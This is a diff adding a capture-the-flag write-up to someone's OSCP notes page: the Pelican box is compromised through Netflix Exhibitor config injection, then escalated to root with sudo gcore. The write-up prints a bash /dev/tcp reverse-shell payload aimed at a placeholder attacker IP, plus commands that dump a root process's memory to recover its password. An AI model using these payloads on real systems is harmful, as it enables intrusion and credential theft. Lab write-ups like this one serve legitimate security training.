@@ -159,7 +159,7 @@ mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-c
       <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
     </div>
     <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
-    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
   </aside>
   <div id="main">
     <div id="topbar">
@@ -174,13 +174,83 @@ mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-c
 <h2 id="v10--challenge-labs-boxes-my-per-box-writeups">🗂️ CHALLENGE LABS &amp; BOXES — my per-box writeups<a class="anchor" href="#v10--challenge-labs-boxes-my-per-box-writeups">#</a></h2>
 <blockquote>Every machine I&#x27;ve rooted: the attack chain, exact commands, learnings, and rabbit holes to not repeat. Source files live in <code>OSCP-Challenge-Labs/</code>; add a box there and rebuild.</blockquote>
 <hr>
+<h1 id="v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)<a class="anchor" href="#v10-pelican-proving-grounds-practice-linux-intermediate">#</a></h1>
+<ul>
+<li><strong>IP:</strong> 192.168.123.98   <strong>Date:</strong> 2026-10-12</li>
+<li><strong>One-line:</strong> Netflix <strong>Exhibitor</strong> web UI (<code>java.env</code> config-injection) → RCE as *charles* → <code>sudo gcore</code> to dump the memory of a root process literally named **<code>password-store</code>** → read the root password out of memory → <code>su root</code>.</li>
+</ul>
+<hr>
+<h2 id="v10-1-enumeration">1. Enumeration<a class="anchor" href="#v10-1-enumeration">#</a></h2>
+<pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
+nmap -p22,139,445,631,2181,2222,8080,8081,34051 -sCV -Pn -oN scans/services.txt $IP</code></pre>
+<div class="tablewrap"><table><thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead><tbody>
+<tr><td>22 / 2222</td><td>OpenSSH 7.9</td><td>two SSH ports (same host key)</td></tr>
+<tr><td>139/445</td><td>Samba 4.9.5</td><td>guest; nothing useful here</td></tr>
+<tr><td>631</td><td>CUPS 2.2</td><td>🐇 distraction</td></tr>
+<tr><td><strong>2181</strong></td><td><strong>Apache ZooKeeper 3.4.6</strong></td><td>managed by Exhibitor</td></tr>
+<tr><td><strong>8080</strong></td><td>Jetty → **<code>/exhibitor/v1/ui/index.html</code>**</td><td>🎯 <strong>Netflix Exhibitor</strong></td></tr>
+<tr><td>8081</td><td>nginx</td><td>just redirects to the Exhibitor UI on 8080</td></tr>
+<tr><td>34051</td><td>Java RMI</td><td>not needed</td></tr>
+</tbody></table></div>
+<p><strong>🔑 How I identified the foothold:</strong> the 8081→8080 redirect pointed at **<code>/exhibitor/v1/ui/</code><strong>. The word </strong><code>exhibitor</code>** in the path is a *product name*, not a generic route — and ZooKeeper sits right next to it on 2181. Googling <strong>&quot;exhibitor zookeeper&quot;</strong> → <strong>Netflix Exhibitor</strong> (a ZK supervisor with a web config UI). Then <strong>&quot;exhibitor RCE&quot;</strong> → the <code>java.env</code> config-injection. *Method, not memory: unfamiliar string in output → Google it → that&#x27;s the product → search its exploits.*</p>
+<h2 id="v10-2-foothold-user-charles">2. Foothold (user = charles)<a class="anchor" href="#v10-2-foothold-user-charles">#</a></h2>
+<p><strong>Vector:</strong> Netflix Exhibitor lets you edit a **<code>java.env</code><strong> script in its Config tab. Exhibitor writes that to a file that ZooKeeper </strong>sources (executes)** on restart → arbitrary command execution as the user running Exhibitor (*charles*).</p>
+<p><strong>Steps:</strong></p>
+<pre><code># 1) Kali listener:
+nc -lvnp 443
+# 2) Exhibitor UI → http://192.168.123.98:8080/exhibitor/v1/ui/index.html → Config tab → toggle Editing on
+#    put this in the java.env field:
+$(/bin/bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/443 0&gt;&amp;1)
+# 3) Commit the config, then Restart ZooKeeper from the Exhibitor controls → java.env runs → shell lands</code></pre>
+<p>Landed as **<code>charles</code>** (uid=1000) in <code>/opt/zookeeper</code>.</p>
+<ul>
+<li><strong>local.txt:</strong> <code>[captured]</code></li>
+</ul>
+<p><strong>Stabilise immediately</strong> (learned the hard way — see rabbit holes):</p>
+<pre><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;   # Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm</code></pre>
+<h2 id="v10-3-privilege-escalation-root">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root">#</a></h2>
+<p><strong>Dead-end first (and that&#x27;s fine):</strong> <code>getcap -r /</code> showed only <code>cap_net_raw</code> (ping), <code>cap_ipc_lock</code> (keyring), <code>cap_net_bind/admin</code> (gstreamer) — <strong>none exploitable.</strong> No <code>cap_setuid</code> on a code-running binary. *Lesson: don&#x27;t force a technique; empty vector → next one.*</p>
+<p>**The real path — <code>sudo gcore</code>:**</p>
+<pre><code>sudo -l
+#   (ALL) NOPASSWD: /usr/bin/gcore      ← charles can run gcore as ROOT</code></pre>
+<p><strong>Why this = root:</strong> <code>gcore</code> dumps the <strong>memory of a running process</strong> to a file. With <code>sudo</code>, you can dump <strong>any</strong> process — including root-owned ones — and process memory is full of <strong>secrets</strong>. So: find a privileged process holding a credential → dump it → <code>strings</code> the dump → read the secret.</p>
+<pre><code>ps aux
+#   root  494  /usr/bin/password-store   ← a root process LITERALLY named &quot;password-store&quot;
+sudo /usr/bin/gcore -o /tmp/dump 494                        # dump its memory (as root)
+strings /tmp/dump.494 | grep -i -A5 -B2 &#x27;Password&#x27;          # → &quot;Password: root:&quot; + the value next to it</code></pre>
+<p>That revealed the <strong>root password</strong>. Then:</p>
+<pre><code>su root        # paste the recovered password  (needs a STABLE shell — see rabbit holes)
+id             # uid=0(root) 🎉
+cat /root/proof.txt</code></pre>
+<ul>
+<li><strong>proof.txt:</strong> <code>[captured]</code></li>
+</ul>
+<h2 id="v10-4-learnings-tips">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips">#</a></h2>
+<ul>
+<li><strong>Recognition by product name.</strong> <code>/exhibitor/</code> in a URL = the product Exhibitor. Unfamiliar string → Google it → find its exploit. You don&#x27;t need to know every app.</li>
+<li><strong>&quot;What does this tool DO as root?&quot;</strong> When <code>sudo -l</code> gives an *odd* binary, reason about its capability. <code>gcore</code> dumps memory → memory holds secrets → dump a secret-holding root process → read the credential. This mindset cracks weird privescs that aren&#x27;t on GTFOBins.</li>
+<li>**<code>ps aux</code> names are clues.** A process called <code>password-store</code> is a giant arrow. Read process lists for intent.</li>
+<li><strong>Don&#x27;t force a technique.</strong> Capabilities looked promising but were a dead end — pivoting to <code>sudo -l</code> found the real path in seconds.</li>
+</ul>
+<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them">#</a></h2>
+<ul>
+<li>⚠️ <strong>Ctrl+C killed my reverse shell.</strong> In an unstabilised shell there&#x27;s no job control, so <strong>Ctrl+C drops the whole connection.</strong> After that, commands I typed ran on <strong>Kali</strong> by mistake (<code>gcore: command not found</code>, <code>No such file</code>). → **Always stabilise (python pty + <code>stty raw -echo</code>) before doing anything, and never Ctrl+C a raw shell.**</li>
+<li>⚠️ **<code>su</code> needs a real TTY.** In a dumb shell the password prompt misbehaves → stabilise first, *then* <code>su root</code>.</li>
+<li>⚠️ <strong>SSH-key route hit a booby-trapped login.</strong> Planting my key worked (auth succeeded), but charles&#x27;s login ran a bogus <code>foo</code> command and the server denied a PTY (<code>PTY allocation request failed</code>) → session died. Bypass = <code>ssh -i key charles@IP -tt &quot;bash --noprofile --norc&quot;</code>. In the end, <strong>restarting the lab + re-running the Exhibitor reverse shell</strong> (then stabilising) was the clean way back in.</li>
+<li>🐇 Ignore CUPS (631), Java RMI (34051), Samba — all distractions on this box.</li>
+</ul>
+<h2 id="v10-6-kb-tags-used">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used">#</a></h2>
+<ul>
+<li><code class="tag">[ENUM-UNUSUAL-PORTS]</code> (identify Exhibitor) · <code class="tag">[WEB-QUICK]</code> · <code class="tag">[SHELL-QUICK]</code> / <code class="tag">[SHELL-STABILIZE]</code> (the Ctrl+C lesson) · <code class="tag">[REVERSE-SHELL-NOT-CONNECTING]</code> · <code class="tag">[LINUX-SUDO]</code> (sudo gcore) · <code class="tag">[LINUX-CAP]</code> (the dead-end check) · <code class="tag">[LINUX-CREDS]</code> · <code class="tag">[FLAG-HUNT]</code></li>
+</ul>
+<hr>
 <h1 id="v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)<a class="anchor" href="#v10-twiggy-proving-grounds-practice-linux-easy">#</a></h1>
 <ul>
 <li><strong>IP:</strong> 192.168.134.62   <strong>Date:</strong> 2026-10-08   <strong>Time to root:</strong> fast (recognition → PoC)</li>
 <li><strong>One-line:</strong> Spotted SaltStack by its 4505/4506 ZeroMQ ports → unauth RCE (CVE-2020-11651) → salt-master runs as <strong>root</strong> → read the flag directly.</li>
 </ul>
 <hr>
-<h2 id="v10-1-enumeration">1. Enumeration<a class="anchor" href="#v10-1-enumeration">#</a></h2>
+<h2 id="v10-1-enumeration-1">1. Enumeration<a class="anchor" href="#v10-1-enumeration-1">#</a></h2>
 <p><strong>All-ports scan:</strong></p>
 <pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
 # open: 22, 53, 80, 4505, 4506, 8000
